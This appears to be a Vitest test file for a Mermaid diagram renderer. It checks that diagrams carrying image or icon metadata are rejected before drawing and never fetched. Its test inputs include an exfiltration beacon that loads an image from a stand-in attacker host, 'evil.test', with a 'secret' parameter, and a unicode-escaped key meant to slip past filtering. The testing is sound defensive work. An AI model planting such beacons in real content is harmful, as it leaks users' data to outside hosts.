// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import mermaid from "mermaid";
import { renderMermaid } from "./mermaid-renderer";

// Only browser geometry and network loading are shimmed; Mermaid parsing/drawing is real.
beforeEach(() => {
  Object.defineProperty(SVGElement.prototype, "getBBox", {
    configurable: true,
    value: () => ({ x: 0, y: 0, width: 80, height: 30 }),
  });
  Object.defineProperty(SVGElement.prototype, "getComputedTextLength", {
    configurable: true,
    value: () => 80,
  });
});
afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  document.body.replaceChildren();
});

it("rejects image metadata before drawing and does not block the next diagram on decode", async () => {
  const sources: string[] = [];
  let releaseDecode = () => {};
  let imageRequested = () => {};
  const requested = new Promise<void>((resolve) => {
    imageRequested = resolve;
  });
  const pendingDecode = new Promise<void>((resolve) => {
    releaseDecode = resolve;
  });
  vi.stubGlobal(
    "Image",
    class {
      naturalWidth = 20;
      naturalHeight = 20;
      set src(value: string) {
        sources.push(value);
        imageRequested();
      }
      decode() {
        return pendingDecode;
      }
    }
  );
  const normal = "sequenceDiagram\n Alice->>Bob: Hello";
  expect(await renderMermaid(normal, false)).not.toBeNull();
  const first = renderMermaid(
    'flowchart LR\n A@{ img: "https://evil.test/pixel?secret=example" }',
    false
  );
  const next = renderMermaid(normal, false);
  try {
    const outcome = await Promise.race([
      first.then(() => "settled"),
      requested.then(() => "requested"),
    ]);
    expect(outcome).toBe("settled");
    expect(sources).toEqual([]);
    expect(await first).toBeNull();
    expect(await next).not.toBeNull();
  } finally {
    releaseDecode();
    await Promise.all([first, next]);
  }
});

it.each([
  'flowchart LR\n A@{ "img": "pixel" }',
  'flowchart LR\n A@{ "\\u0069mg": "pixel" }',
  'sequenceDiagram\n participant Alice\n properties Alice: {"icon":"pixel"}\n Alice->>Bob: Hello',
])("rejects resource-bearing metadata before Mermaid draws: %s", async (source) => {
  const draw = vi.spyOn(mermaid, "render");
  expect(await renderMermaid(source, false)).toBeNull();
  expect(draw).not.toHaveBeenCalled();
});

it("continues rendering resource-free metadata", async () => {
  const draw = vi.spyOn(mermaid, "render");
  expect(
    await renderMermaid('flowchart LR\n A@{ shape: rect, label: "Safe" } --> B', false)
  ).not.toBeNull();
  expect(draw).toHaveBeenCalledOnce();
});

it("preserves readable source when math labels require foreignObject", async () => {
  const render = vi.spyOn(mermaid, "render");
  const result = await renderMermaid("sequenceDiagram\n Alice->>Bob: $$x^2$$", false);
  expect(render).toHaveBeenCalledOnce();
  const generated = await render.mock.results[0].value;
  expect(generated.svg).toContain("foreignObject");
  expect(result).toBeNull();
});
